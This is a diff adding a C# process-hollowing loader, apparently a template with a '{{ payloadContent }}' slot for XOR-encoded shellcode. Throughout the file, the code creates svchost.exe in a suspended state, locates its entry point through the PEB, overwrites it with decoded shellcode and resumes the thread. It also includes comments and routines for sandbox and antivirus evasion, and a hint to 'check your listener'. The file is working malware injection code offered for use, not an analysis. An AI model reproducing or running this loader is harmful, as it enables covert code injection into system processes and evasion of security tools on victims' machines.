@@ -1,0 +1,290 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text.RegularExpressions;
+
+namespace ProcessHollowing
+{
+    public class Program
+    {
+        public const uint CREATE_SUSPENDED = 0x4;
+        public const int PROCESSBASICINFORMATION = 0;
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        internal struct PebInfo
+        {
+            public IntPtr entrypointAddr;
+            public IntPtr bytesRW;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        internal struct ProcessBase
+        {
+            public StartupInfo sInfo;
+            public ProcessInfo pInfo;
+            public bool cResult;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        internal struct ProcessInfo
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public Int32 ProcessId;
+            public Int32 ThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        internal struct StartupInfo
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct ProcessBasicInfo
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            ExecuteReadWrite = 0x40
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
+            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
+            int dwSize, out IntPtr lpNumberOfbytesRW);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+        [DllImport("kernel32.dll", SetLastError = true)]
+
+
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        private static ProcessBase createProcess(string servicePath)
+        {
+            // Start service in a suspended state
+            StartupInfo sInfo = new StartupInfo();
+            ProcessInfo pInfo = new ProcessInfo();
+
+            // Create process
+            bool cResult = CreateProcess(null, servicePath, IntPtr.Zero, IntPtr.Zero,
+                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
+            Console.WriteLine($"Started {servicePath} in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");
+
+            ProcessBase processbase;
+            processbase.sInfo = sInfo;
+            processbase.pInfo = pInfo;
+            processbase.cResult = cResult;
+            return processbase;
+        }
+
+
+        private static PebInfo readPEB(StartupInfo sInfo, ProcessInfo pInfo)
+        {
+            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
+            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
+            uint retLen = new uint();
+            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
+            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
+            byte[] procAddr = new byte[0x8];
+            byte[] dataBuf = new byte[0x200];
+            IntPtr bytesRW = new IntPtr();
+            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
+            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
+            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
+
+            // calculate buffer
+            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
+            uint rvaOffset = e_lfanew + 0x28;
+            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
+
+            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
+
+            PebInfo pebInfo;
+            pebInfo.bytesRW = bytesRW;
+            pebInfo.entrypointAddr = entrypointAddr;
+
+            return pebInfo;
+        }
+
+        private static bool IsProcessAlive(string servicePath, Process hProcess)
+        {
+            if (hProcess.HasExited != true)
+            {
+                Console.WriteLine($"Created {servicePath} is still alive! {hProcess.Id}.");
+                return true;
+            }
+
+            else
+            {
+                // Process died for some reason
+                return false;
+            }
+        }
+
+        private static byte[] generateShellcode()
+        {
+            {{ payloadContent }}
+
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+            }
+            return buf;
+        }
+
+        private static void sleep()
+        {
+            Console.WriteLine("zzz...");
+            DateTime t1 = DateTime.Now;
+            Sleep(10000);
+            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (deltaT < 9.5)
+            {
+                return;
+            }
+        }
+
+        private static bool IsElevated
+        {
+            get
+            {
+                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
+            }
+        }
+
+        static void Main(string[] args)
+        {
+
+            // Sandbox evasion
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            // target lists
+            List<string> targets = new List<string>();
+
+            // Elevated Privilege Check
+            if (IsElevated)
+            {
+                //targets.Add("c:\\windows\\explorer.exe");
+                targets.Add("c:\\windows\\system32\\svchost.exe");
+            }
+            else
+            {
+                //targets.Add("c:\\windows\\system32\\svchost.exe");
+                //targets.Add("c:\\windows\\system32\\conhost.exe");
+            }
+
+
+            // list of processes to create
+
+            foreach (var target in targets)
+            {
+                // Create Process
+                ProcessBase processbase = createProcess(target);
+
+                // exit if not created properly
+                if (processbase.cResult != true)
+                {
+                    //Console.WriteLine($"Process was not created :{target}");
+                    Environment.Exit(0);
+                }
+
+                // Sleep for 10s
+                sleep();
+
+                // Get the process by Id
+                var hProcess = Process.GetProcessById(processbase.pInfo.ProcessId);
+
+                // Check if Process is still alive
+                if (IsProcessAlive(target, hProcess) == false)
+                {
+                    //Console.WriteLine($"Created {target} died :( {hProcess.Id}.");
+                    Environment.Exit(0);
+                }
+
+                // Hollowing Happens here
+                PebInfo pebInfo = readPEB(processbase.sInfo, processbase.pInfo);
+
+                // import shellcode
+                byte[] buf = generateShellcode();
+
+                // AV evasion: Sleep for 10s and detect if time really passed
+                sleep();
+
+                // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
+                WriteProcessMemory(processbase.pInfo.hProcess, pebInfo.entrypointAddr, buf, buf.Length, out pebInfo.bytesRW);
+                //Console.WriteLine("Hijacking...");
+
+                // Resume the thread to trigger our payload
+                ResumeThread(processbase.pInfo.hThread);
+                //Console.WriteLine("Check your listener...");
+
+            }
+        }
+    }
+}
